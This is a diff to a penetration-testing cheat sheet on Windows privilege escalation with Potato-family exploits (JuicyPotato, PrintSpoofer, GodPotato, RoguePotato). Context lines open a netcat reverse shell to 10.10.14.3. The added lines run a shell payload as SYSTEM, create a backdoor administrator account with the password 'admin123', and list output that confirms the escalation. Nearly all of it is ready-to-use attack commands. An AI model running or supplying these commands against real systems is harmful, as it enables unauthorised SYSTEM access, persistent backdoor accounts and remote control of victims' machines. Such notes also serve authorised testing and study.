@@ -23,6 +23,24 @@ JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 1
 PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 ```
 
+If PrintSpoofer finds `SeImpersonatePrivilege` but fails or times out, try another Potato family exploit instead of assuming the privilege is unusable.
+
+### GodPotato
+```cmd
+GodPotato.exe -cmd "cmd.exe /c C:\path\to\shell.exe"
+GodPotato.exe -cmd "cmd.exe /c net user admin admin123 /add"
+GodPotato.exe -cmd "cmd.exe /c net localgroup Administrators admin /add"
+```
+
+Good indicators:
+
+```text
+CurrentUser: NT AUTHORITY\NETWORK SERVICE
+Find System Token : True
+CurrentUser: NT AUTHORITY\SYSTEM
+process start with pid <pid>
+```
+
 ### RoguePotato
 - Alternative to JuicyPotato for newer Windows versions
 - https://github.com/antonioCoco/RoguePotato
